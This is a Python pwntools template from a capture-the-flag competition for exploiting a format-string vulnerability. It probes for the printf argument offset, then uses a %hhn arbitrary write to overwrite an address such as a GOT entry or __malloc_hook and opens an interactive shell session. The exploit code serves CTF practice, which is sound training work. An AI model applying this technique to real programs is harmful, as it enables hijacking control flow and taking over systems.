#!/usr/bin/env python3
"""CSCTF pwn template -- format-string: leak the stack, then an arbitrary %n write.

FILL-ME
  BINARY   : challenge ELF
  HOST,PORT: assigned remote target
  OFFSET   : the printf argument index where YOUR buffer begins (find it with the probe below)
  TARGET   : address to overwrite (e.g. a GOT slot, __malloc_hook, a saved return address)
  VALUE    : value to write there (e.g. a win() address, or system)

Find OFFSET offline then confirm live:
  from solvers.toolkits import pwn_exploit as X
  io.sendline(X.fmtstr_probe())         # prints |%1$p|%2$p|...  -- the slot showing 0x4141... is OFFSET
Build the write offline (glibc-correct, byte-granular %hhn):
  payload = X.fmtstr_write(OFFSET, {TARGET: VALUE}, word=8)

The same helpers power pwn_exploit's GOT-overwrite planner:
  .venv/bin/python solvers/toolkits/pwn_exploit.py BINARY      # shows resolvable GOT slots

RUN ONLY in docker/pwn (csctf-pwn:1), ONLY against the assigned target.
"""
import sys
from pathlib import Path
from pwn import *

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "solvers" / "toolkits"))
import pwn_exploit as X     # the offline payload builder

# ---- FILL-ME -------------------------------------------------------------
BINARY = "./chall"
HOST, PORT = "CHALLENGE.HOST", 0
OFFSET = 6            # printf arg index of our buffer (confirm with fmtstr_probe)
TARGET = 0x0          # address to overwrite
VALUE = 0x0           # value to write
WORD = 8             # 8 for 64-bit, 4 for 32-bit
WRITTEN = 0          # bytes printf already emitted before our input (fixed prefix length)
# --------------------------------------------------------------------------

context.binary = exe = ELF(BINARY, checksec=False)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(exe.path)


def find_offset():
    """Send the probe and eyeball which %N$p shows 0x4141414141414141."""
    io = start()
    io.sendline(X.fmtstr_probe())
    print(io.recvall(timeout=2).decode("latin-1"))
    io.close()


def do_write():
    payload = X.fmtstr_write(OFFSET, {TARGET: VALUE}, written=WRITTEN, word=WORD)
    io = start()
    io.sendline(payload)
    io.interactive()      # look for CSCTF{...}


if __name__ == "__main__":
    if args.FINDOFF:
        find_offset()
    else:
        do_write()
